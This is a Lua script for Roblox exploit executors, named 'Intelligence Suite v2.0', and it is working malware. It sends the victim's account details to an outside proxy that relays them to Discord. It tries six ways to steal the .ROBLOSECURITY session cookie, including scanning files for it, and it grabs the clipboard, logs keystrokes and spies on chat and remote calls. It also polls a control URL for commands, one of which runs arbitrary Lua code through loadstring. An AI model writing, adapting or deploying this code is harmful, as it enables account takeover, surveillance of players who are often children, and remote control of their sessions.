-- Intelligence Suite v2.0
-- loadstring(game:HttpGet("https://raw.githubusercontent.com/bcakhub/ghost/main/suite.lua"))()

local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local PROXY = "https://roblox-discord-proxy.kevinaugusta27.workers.dev/webhook"
local CONTROL = "https://roblox-discord-proxy.kevinaugusta27.workers.dev/control"

getgenv().IntelSuite = {
    Buffer = "",
    IsActive = true,
    ChatSpyActive = false,
    RemoteSpyActive = false,
    MouseLogActive = false
}

local function POST(url, body)
    local h = {["Content-Type"] = "application/json"}
    pcall(function()
        if request then
            request({Url=url, Method="POST", Headers=h, Body=body})
        elseif http_request then
            http_request({Url=url, Method="POST", Headers=h, Body=body})
        elseif syn and syn.request then
            syn.request({Url=url, Method="POST", Headers=h, Body=body})
        else
            HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
        end
    end)
end

local function GET(url)
    local out = nil
    pcall(function()
        if request then
            out = request({Url=url, Method="GET"}).Body
        elseif http_request then
            out = http_request({Url=url, Method="GET"}).Body
        elseif syn and syn.request then
            out = syn.request({Url=url, Method="GET"}).Body
        end
    end)
    return out
end

local function send(title, desc, color)
    local ok, encoded = pcall(function()
        return HttpService:JSONEncode({
            embeds = {{
                title = tostring(title),
                description = tostring(desc):sub(1, 1900),
                color = color or 65535,
                footer = {text = "Intelligence Suite v2.0"},
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        })
    end)
    if ok and encoded then POST(PROXY, encoded) end
end

local function getExec()
    if identifyexecutor then
        local ok, r = pcall(identifyexecutor)
        if ok and r then return tostring(r) end
    end
    if getexecutorname then
        local ok, r = pcall(getexecutorname)
        if ok and r then return tostring(r) end
    end
    if syn and syn.version then return "Synapse X" end
    if KRNL_LOADED then return "KRNL" end
    if listfiles then
        local ok, f = pcall(listfiles, "")
        if ok and f then
            for _, v in ipairs(f) do
                local l = tostring(v):lower()
                if l:find("xeno") then return "Xeno" end
                if l:find("krnl") then return "KRNL" end
                if l:find("synapse") then return "Synapse X" end
                if l:find("scriptware") then return "Script-Ware" end
                if l:find("solara") then return "Solara" end
                if l:find("wave") then return "Wave" end
                if l:find("delta") then return "Delta" end
            end
        end
    end
    return "Unknown"
end

local function getGame()
    local name = "Unknown"
    pcall(function()
        name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)
    return name
end

local function getPlayerList()
    local list = ""
    local count = 0
    for _, p in ipairs(Players:GetPlayers()) do
        count = count + 1
        list = list .. "\n- **" .. p.Name .. "** (ID: " .. tostring(p.UserId) .. ", Age: " .. tostring(p.AccountAge) .. "d)"
    end
    return list, count
end

-- ============================================================
-- MODULE 1: Execution Alert
-- ============================================================
task.spawn(function()
    local exec = getExec()
    local game_name = getGame()
    local playerList, playerCount = getPlayerList()
    send("SCRIPT EXECUTED",
        "**User:** " .. LocalPlayer.Name ..
        "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
        "\n**Display Name:** " .. LocalPlayer.DisplayName ..
        "\n**Account Age:** " .. tostring(LocalPlayer.AccountAge) .. " days" ..
        "\n**Executor:** " .. exec ..
        "\n**Game:** " .. game_name ..
        "\n**Place ID:** " .. tostring(game.PlaceId) ..
        "\n**Job ID:** " .. tostring(game.JobId) ..
        "\n**Players in server:** " .. tostring(playerCount) ..
        "\n\n**Active Modules:** Keylogger, Token Stealer, API Scraper, Clipboard, Anti-AFK, Heartbeat, Kill Switch",
        65280
    )
end)

task.wait(1)

-- ============================================================
-- MODULE 2: Full Roblox API Scraper
-- ============================================================
task.spawn(function()
    if not getgenv().IntelSuite.IsActive then return end
    local uid = tostring(LocalPlayer.UserId)
    local desc = "**User:** " .. LocalPlayer.Name ..
        "\n**User ID:** " .. uid ..
        "\n**Display Name:** " .. LocalPlayer.DisplayName ..
        "\n**Account Age:** " .. tostring(LocalPlayer.AccountAge) .. " days" ..
        "\n**Executor:** " .. getExec() ..
        "\n**Game:** " .. getGame() ..
        "\n**Place ID:** " .. tostring(game.PlaceId) ..
        "\n**Job ID:** " .. tostring(game.JobId)

    -- Premium check
    local premium = LocalPlayer.MembershipType == Enum.MembershipType.Premium
    desc = desc .. "\n**Premium:** " .. tostring(premium)

    -- Friends count
    pcall(function()
        local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/friends/count")
        if r then
            local d = HttpService:JSONDecode(r)
            desc = desc .. "\n**Friends:** " .. tostring(d.count)
        end
    end)

    -- Followers count
    pcall(function()
        local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/followers/count")
        if r then
            local d = HttpService:JSONDecode(r)
            desc = desc .. "\n**Followers:** " .. tostring(d.count)
        end
    end)

    -- Following count
    pcall(function()
        local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/followings/count")
        if r then
            local d = HttpService:JSONDecode(r)
            desc = desc .. "\n**Following:** " .. tostring(d.count)
        end
    end)

    -- Robux balance (if accessible)
    pcall(function()
        local r = GET("https://economy.roblox.com/v1/users/" .. uid .. "/currency")
        if r then
            local d = HttpService:JSONDecode(r)
            if d.robux then
                desc = desc .. "\n**Robux:** " .. tostring(d.robux)
            end
        end
    end)

    -- Groups
    pcall(function()
        local r = GET("https://groups.roblox.com/v1/users/" .. uid .. "/groups/roles")
        if r then
            local d = HttpService:JSONDecode(r)
            if d.data then
                local groups = "\n**Groups:**"
                local count = 0
                for _, g in ipairs(d.data) do
                    if count >= 5 then break end
                    groups = groups .. "\n  - " .. tostring(g.group.name) .. " [" .. tostring(g.role.name) .. "]"
                    count = count + 1
                end
                desc = desc .. groups
            end
        end
    end)

    -- Past usernames
    pcall(function()
        local r = GET("https://users.roblox.com/v1/users/" .. uid .. "/username-history?limit=5")
        if r then
            local d = HttpService:JSONDecode(r)
            if d.data and #d.data > 0 then
                local names = "\n**Past Usernames:**"
                for _, n in ipairs(d.data) do
                    names = names .. "\n  - " .. tostring(n.name)
                end
                desc = desc .. names
            end
        end
    end)

    -- Badge count
    pcall(function()
        local r = GET("https://badges.roblox.com/v1/users/" .. uid .. "/badges?limit=10")
        if r then
            local d = HttpService:JSONDecode(r)
            if d.data then
                desc = desc .. "\n**Badges (first 10):** " .. tostring(#d.data)
            end
        end
    end)

    -- Game passes owned
    pcall(function()
        local r = GET("https://inventory.roblox.com/v1/users/" .. uid .. "/items/GamePass?limit=10")
        if r then
            local d = HttpService:JSONDecode(r)
            if d.data and #d.data > 0 then
                local passes = "\n**Game Passes:**"
                for _, p in ipairs(d.data) do
                    passes = passes .. "\n  - " .. tostring(p.name)
                end
                desc = desc .. passes
            end
        end
    end)

    send("FULL ACCOUNT SCRAPE", desc, 65535)
end)

task.wait(1)

-- ============================================================
-- MODULE 3: Token Stealer v6
-- ============================================================
task.spawn(function()
    local exec = getExec()
    local token = nil
    local log = {}

    send("TOKEN STEALER STARTED",
        "**User:** " .. LocalPlayer.Name ..
        "\n**Executor:** " .. exec ..
        "\n**Status:** Running all 6 methods...",
        16776960
    )

    task.wait(0.3)

    pcall(function()
        if syn and syn.get_cookie then
            local ok, r = pcall(syn.get_cookie, ".ROBLOSECURITY")
            if ok and r and r ~= "" then token = r table.insert(log, "M1: SUCCESS") end
        else table.insert(log, "M1: SKIPPED") end
    end)
    if token then
        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M1\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
        return
    end
    task.wait(0.3)

    pcall(function()
        if get_cookie then
            local ok, r = pcall(get_cookie, ".ROBLOSECURITY")
            if ok and r and r ~= "" then token = r table.insert(log, "M2: SUCCESS") end
        else table.insert(log, "M2: SKIPPED") end
    end)
    if token then
        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M2\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
        return
    end
    task.wait(0.3)

    pcall(function()
        if getrbxcookie then
            local ok, r = pcall(getrbxcookie)
            if ok and r and r ~= "" then token = r table.insert(log, "M3: SUCCESS") end
        else table.insert(log, "M3: SKIPPED") end
    end)
    if token then
        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M3\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
        return
    end
    task.wait(0.3)

    pcall(function()
        if getcookies then
            local ok, r = pcall(function() local c = getcookies() return c and c[".ROBLOSECURITY"] end)
            if ok and r and r ~= "" then token = r table.insert(log, "M4: SUCCESS") end
        else table.insert(log, "M4: SKIPPED") end
    end)
    if token then
        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M4\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
        return
    end
    task.wait(0.3)

    pcall(function()
        if listfiles and readfile then
            local scanned = 0
            local function scan(path)
                if scanned >= 200 or token then return end
                local ok, files = pcall(listfiles, path)
                if not ok or not files then return end
                for _, f in ipairs(files) do
                    if scanned >= 200 or token then return end
                    scanned = scanned + 1
                    local rok, content = pcall(readfile, f)
                    if rok and type(content) == "string" then
                        local found = content:match("%.ROBLOSECURITY=([^;%s\"'\n\r]+)")
                        if found and #found > 20 then token = found end
                    end
                end
            end
            scan("")
            if not token then
                local ok, root = pcall(listfiles, "")
                if ok and root then
                    for _, item in ipairs(root) do
                        if token then break end
                        pcall(function() scan(item) end)
                    end
                end
            end
            table.insert(log, "M5: scanned " .. tostring(scanned) .. " files")
            if token then
                send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M5 file scan\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
            end
        else table.insert(log, "M5: SKIPPED") end
    end)
    if token then return end
    task.wait(0.3)

    pcall(function()
        if request then
            local ok, r = pcall(function() return request({Url="https://www.roblox.com/", Method="GET"}) end)
            if ok and r and r.Headers then
                local sc = r.Headers["set-cookie"] or r.Headers["Set-Cookie"] or ""
                local found = sc:match("%.ROBLOSECURITY=([^;]+)")
                if found and found ~= "" then
                    token = found
                    table.insert(log, "M6: SUCCESS")
                    send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M6\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
                else table.insert(log, "M6: FAILED") end
            else table.insert(log, "M6: FAILED") end
        else table.insert(log, "M6: SKIPPED") end
    end)

    if not token then
        send("TOKEN STEALER FAILED",
            "**User:** " .. LocalPlayer.Name ..
            "\n**Executor:** " .. exec ..
            "\n**Log:**\n```" .. table.concat(log, "\n"):sub(1,1000) .. "```",
            16711680
        )
    end
end)

task.wait(2)

-- ============================================================
-- MODULE 4: Clipboard Stealer
-- ============================================================
task.spawn(function()
    if not getgenv().IntelSuite.IsActive then return end
    pcall(function()
        if getclipboard then
            local ok, clip = pcall(getclipboard)
            if ok and clip and clip ~= "" then
                send("CLIPBOARD",
                    "**User:** " .. LocalPlayer.Name ..
                    "\n**Content:**\n```" .. tostring(clip):sub(1, 1500) .. "```",
                    16711680
                )
            else
                send("CLIPBOARD", "**User:** " .. LocalPlayer.Name .. "\n**Content:** Empty or not accessible.", 8421504)
            end
        else
            send("CLIPBOARD", "**User:** " .. LocalPlayer.Name .. "\n**Content:** getclipboard() not available on this executor.", 8421504)
        end
    end)
end)

task.wait(1)

-- ============================================================
-- MODULE 5: Keylogger
-- ============================================================
UserInputService.InputBegan:Connect(function(input, gp)
    if not getgenv().IntelSuite.IsActive then return end
    pcall(function()
        if input.KeyCode and input.KeyCode ~= Enum.KeyCode.Unknown then
            getgenv().IntelSuite.Buffer = getgenv().IntelSuite.Buffer .. "[" .. input.KeyCode.Name .. "]"
        end
        if #getgenv().IntelSuite.Buffer >= 50 then
            send("KEYLOG", "**User:** " .. LocalPlayer.Name .. "\n**Keys:** " .. getgenv().IntelSuite.Buffer, 16711680)
            getgenv().IntelSuite.Buffer = ""
        end
    end)
end)

-- ============================================================
-- MODULE 6: Anti-AFK
-- ============================================================
task.spawn(function()
    while true do
        task.wait(60)
        if not getgenv().IntelSuite.IsActive then continue end
        pcall(function()
            -- Fire a virtual input to prevent AFK kick
            local v = Instance.new("VirtualUser")
            v.Parent = game
            game:GetService("VirtualUser"):CaptureController()
            game:GetService("VirtualUser"):ClickButton2(Vector2.new(0,0))
        end)
    end
end)

-- ============================================================
-- MODULE 7: Mouse Logger (every 30s)
-- ============================================================
task.spawn(function()
    while true do
        task.wait(30)
        if not getgenv().IntelSuite.IsActive then continue end
        if not getgenv().IntelSuite.MouseLogActive then continue end
        pcall(function()
            local mouse = LocalPlayer:GetMouse()
            send("MOUSE LOG",
                "**User:** " .. LocalPlayer.Name ..
                "\n**Position:** X=" .. tostring(mouse.X) .. " Y=" .. tostring(mouse.Y) ..
                "\n**Target:** " .. tostring(mouse.Target),
                8388736
            )
        end)
    end
end)

-- ============================================================
-- MODULE 8: Remote Spy Logger
-- ============================================================
task.spawn(function()
    while true do
        task.wait(1)
        if not getgenv().IntelSuite.IsActive then continue end
        if not getgenv().IntelSuite.RemoteSpyActive then continue end
        pcall(function()
            local mt = getrawmetatable(game)
            local old = mt.__namecall
            setreadonly(mt, false)
            mt.__namecall = newcclosure(function(self, ...)
                local method = getnamecallmethod()
                if method == "FireServer" or method == "InvokeServer" then
                    local args = {...}
                    local argStr = ""
                    for i, v in ipairs(args) do
                        argStr = argStr .. "\n  [" .. i .. "] " .. tostring(v)
                    end
                    send("REMOTE SPY",
                        "**User:** " .. LocalPlayer.Name ..
                        "\n**Remote:** " .. tostring(self.Name) ..
                        "\n**Method:** " .. method ..
                        "\n**Path:** " .. tostring(self:GetFullName()) ..
                        "\n**Args:**" .. argStr,
                        16776960
                    )
                end
                return old(self, ...)
            end)
            setreadonly(mt, true)
        end)
        break -- only hook once
    end
end)

-- ============================================================
-- MODULE 9: Command Poller + Kill Switch (every 5s)
-- ============================================================
task.spawn(function()
    while true do
        task.wait(5)
        pcall(function()
            local response = GET(CONTROL)
            if not response or response == "" then return end
            local ok, data = pcall(function() return HttpService:JSONDecode(response) end)
            if not ok or not data then return end

            -- Kill switch
            if data.active ~= nil then
                local wasActive = getgenv().IntelSuite.IsActive
                getgenv().IntelSuite.IsActive = data.active
                if wasActive and not data.active then
                    getgenv().IntelSuite.Buffer = ""
                    send("SUITE STOPPED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Killed remotely.", 16711680)
                elseif not wasActive and data.active then
                    send("SUITE RESUMED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Resumed remotely.", 65280)
                end
            end

            if not data.command or data.command == "" then return end
            if not getgenv().IntelSuite.IsActive then return end

            local cmd = data.command:match("^%s*(.-)%s*$")
            send("CMD RECEIVED", "**Command:** `" .. cmd .. "`\n**User:** " .. LocalPlayer.Name, 16776960)

            if cmd == "ping" then
                local list, count = getPlayerList()
                send("PONG",
                    "**User:** " .. LocalPlayer.Name ..
                    "\n**Game:** " .. getGame() ..
                    "\n**Place:** " .. tostring(game.PlaceId) ..
                    "\n**Players:** " .. tostring(count) .. list,
                    65280)

            elseif cmd == "players" then
                local list, count = getPlayerList()
                send("PLAYER LIST",
                    "**Game:** " .. getGame() ..
                    "\n**Total:** " .. tostring(count) ..
                    "\n**Players:**" .. list,
                    65535)

            elseif cmd == "info" then
                local list, count = getPlayerList()
                send("INFO",
                    "**User:** " .. LocalPlayer.Name ..
                    "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
                    "\n**Executor:** " .. getExec() ..
                    "\n**Game:** " .. getGame() ..
                    "\n**Place ID:** " .. tostring(game.PlaceId) ..
                    "\n**Job ID:** " .. tostring(game.JobId) ..
                    "\n**Active:** " .. tostring(getgenv().IntelSuite.IsActive) ..
                    "\n**ChatSpy:** " .. tostring(getgenv().IntelSuite.ChatSpyActive) ..
                    "\n**RemoteSpy:** " .. tostring(getgenv().IntelSuite.RemoteSpyActive) ..
                    "\n**MouseLog:** " .. tostring(getgenv().IntelSuite.MouseLogActive) ..
                    "\n**Players:** " .. tostring(count) .. list,
                    65535)

            elseif cmd:sub(1,5) == "exec:" then
                local code = cmd:sub(6)
                local fn, err = loadstring(code)
                if fn then
                    local ok2, res = pcall(fn)
                    if ok2 then
                        send("EXEC RESULT", "**Code:**\n```lua\n" .. code:sub(1,400) .. "```\n**Result:** " .. tostring(res), 65280)
                    else
                        send("EXEC ERROR", "**Code:**\n```lua\n" .. code:sub(1,400) .. "```\n**Error:** " .. tostring(res), 16711680)
                    end
                else
                    send("EXEC PARSE ERROR", "**Error:** " .. tostring(err), 16711680)
                end

            elseif cmd == "chatspy" then
                if getgenv().IntelSuite.ChatSpyActive then
                    send("CHAT SPY", "Already active.", 16776960)
                else
                    getgenv().IntelSuite.ChatSpyActive = true
                    for _, p in ipairs(Players:GetPlayers()) do
                        p.Chatted:Connect(function(msg)
                            pcall(function() send("CHAT", "**" .. p.Name .. ":** " .. msg, 8388736) end)
                        end)
                    end
                    Players.PlayerAdded:Connect(function(p)
                        p.Chatted:Connect(function(msg)
                            pcall(function() send("CHAT", "**" .. p.Name .. ":** " .. msg, 8388736) end)
                        end)
                    end)
                    send("CHAT SPY", "Now logging all chat.", 65280)
                end

            elseif cmd == "remotespy" then
                if getgenv().IntelSuite.RemoteSpyActive then
                    send("REMOTE SPY", "Already active.", 16776960)
                else
                    getgenv().IntelSuite.RemoteSpyActive = true
                    send("REMOTE SPY", "Remote spy enabled. Logging all FireServer and InvokeServer calls.", 65280)
                end

            elseif cmd == "mouselog" then
                if getgenv().IntelSuite.MouseLogActive then
                    send("MOUSE LOG", "Already active.", 16776960)
                else
                    getgenv().IntelSuite.MouseLogActive = true
                    send("MOUSE LOG", "Mouse logging enabled. Sending position every 30s.", 65280)
                end

            elseif cmd == "clipboard" then
                pcall(function()
                    if getclipboard then
                        local ok2, clip = pcall(getclipboard)
                        if ok2 and clip and clip ~= "" then
                            send("CLIPBOARD", "**User:** " .. LocalPlayer.Name .. "\n**Content:**\n```" .. tostring(clip):sub(1,1500) .. "```", 16711680)
                        else
                            send("CLIPBOARD", "**User:** " .. LocalPlayer.Name .. "\n**Content:** Empty.", 8421504)
                        end
                    else
                        send("CLIPBOARD", "Not available on this executor.", 8421504)
                    end
                end)

            elseif cmd == "scrape" then
                -- Re-run full API scrape on demand
                local uid = tostring(LocalPlayer.UserId)
                local desc = "**User:** " .. LocalPlayer.Name .. "\n**User ID:** " .. uid
                pcall(function()
                    local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/friends/count")
                    if r then local d = HttpService:JSONDecode(r) desc = desc .. "\n**Friends:** " .. tostring(d.count) end
                end)
                pcall(function()
                    local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/followers/count")
                    if r then local d = HttpService:JSONDecode(r) desc = desc .. "\n**Followers:** " .. tostring(d.count) end
                end)
                pcall(function()
                    local r = GET("https://economy.roblox.com/v1/users/" .. uid .. "/currency")
                    if r then local d = HttpService:JSONDecode(r) if d.robux then desc = desc .. "\n**Robux:** " .. tostring(d.robux) end end
                end)
                send("SCRAPE [ON DEMAND]", desc, 65535)

            elseif cmd == "stop" then
                getgenv().IntelSuite.IsActive = false
                send("STOPPED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Suite deactivated.", 16711680)

            elseif cmd == "start" then
                getgenv().IntelSuite.IsActive = true
                send("STARTED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Suite reactivated.", 65280)
            end
        end)
    end
end)

-- ============================================================
-- MODULE 10: Heartbeat (every 60s)
-- ============================================================
task.spawn(function()
    while true do
        task.wait(60)
        if not getgenv().IntelSuite.IsActive then continue end
        pcall(function()
            local list, count = getPlayerList()
            local desc = "**User:** " .. LocalPlayer.Name ..
                         "\n**Status:** ACTIVE" ..
                         "\n**Game:** " .. getGame() ..
                         "\n**Players:** " .. tostring(count)
            if #getgenv().IntelSuite.Buffer > 0 then
                desc = desc .. "\n**Keys Flushed:** " .. getgenv().IntelSuite.Buffer
                getgenv().IntelSuite.Buffer = ""
            end
            send("HEARTBEAT", desc, 65535)
        end)
    end
end)

-- ============================================================
-- MODULE 10: Remote Spy Logger
-- Activate via !cmd remotespy
-- ============================================================
local function startRemoteSpy()
    if getgenv().IntelSuite.RemoteSpyActive then
        send("REMOTE SPY", "Already active.", 16776960)
        return
    end
    getgenv().IntelSuite.RemoteSpyActive = true

    local oldNamecall
    oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
        local method = getnamecallmethod()
        if method == "FireServer" or method == "InvokeServer" then
            pcall(function()
                if not getgenv().IntelSuite.IsActive then return end
                local args = {...}
                local argStrs = {}
                for i, v in ipairs(args) do
                    local s = ""
                    pcall(function()
                        if type(v) == "table" then
                            s = HttpService:JSONEncode(v)
                        else
                            s = tostring(v)
                        end
                    end)
                    table.insert(argStrs, "[" .. i .. "] " .. s:sub(1, 100))
                    if #argStrs >= 5 then break end
                end
                send("REMOTE SPY",
                    "**Remote:** " .. tostring(self.Name) ..
                    "\n**Path:** " .. tostring(self:GetFullName()) ..
                    "\n**Method:** " .. method ..
                    "\n**Args:**\n```" .. table.concat(argStrs, "\n"):sub(1, 800) .. "```",
                    16711935
                )
            end)
        end
        return oldNamecall(self, ...)
    end)

    send("REMOTE SPY", "Now hooking all FireServer + InvokeServer.\n**User:** " .. LocalPlayer.Name, 65280)
end

getgenv().IntelSuite.RemoteSpyActive = false
getgenv().IntelSuite.StartRemoteSpy = startRemoteSpy



-- ============================================================
-- MODULE 7: Roblox API Scraper
-- ============================================================
local function runAPIScraper()
    if not getgenv().IntelSuite.IsActive then return end
    task.spawn(function()
        local uid = tostring(LocalPlayer.UserId)
        local result = "**User:** " .. LocalPlayer.Name .. "\n**ID:** " .. uid

        -- Premium
        pcall(function()
            local premium = LocalPlayer.MembershipType == Enum.MembershipType.Premium
            result = result .. "\n**Premium:** " .. tostring(premium)
        end)

        -- Account created date
        pcall(function()
            local r = GET("https://users.roblox.com/v1/users/" .. uid)
            if r then
                local d = HttpService:JSONDecode(r)
                if d then result = result .. "\n**Created:** " .. tostring(d.created or "?") end
            end
        end)

        -- Past usernames
        pcall(function()
            local r = GET("https://users.roblox.com/v1/users/" .. uid .. "/username-history?limit=5")
            if r then
                local d = HttpService:JSONDecode(r)
                if d and d.data then
                    local names = {}
                    for _, v in ipairs(d.data) do table.insert(names, v.name) end
                    result = result .. "\n**Past Names:** " .. (#names > 0 and table.concat(names, ", ") or "None")
                end
            end
        end)

        -- Friends count
        pcall(function()
            local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/friends/count")
            if r then
                local d = HttpService:JSONDecode(r)
                if d then result = result .. "\n**Friends:** " .. tostring(d.count or 0) end
            end
        end)

        -- Followers count
        pcall(function()
            local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/followers/count")
            if r then
                local d = HttpService:JSONDecode(r)
                if d then result = result .. "\n**Followers:** " .. tostring(d.count or 0) end
            end
        end)

        -- Groups
        pcall(function()
            local r = GET("https://groups.roblox.com/v2/users/" .. uid .. "/groups/roles")
            if r then
                local d = HttpService:JSONDecode(r)
                if d and d.data then
                    local groups = {}
                    for _, v in ipairs(d.data) do
                        if v.group and v.role then
                            table.insert(groups, v.group.name .. " [" .. v.role.name .. "]")
                        end
                        if #groups >= 5 then break end
                    end
                    result = result .. "\n**Groups:**\n" .. (#groups > 0 and table.concat(groups, "\n") or "None")
                end
            end
        end)

        send("ROBLOX API SCRAPE", result:sub(1, 1900), 16711935)
    end)
end

-- Run on startup
task.wait(3)
runAPIScraper()
getgenv().IntelSuite.APIScraper = runAPIScraper
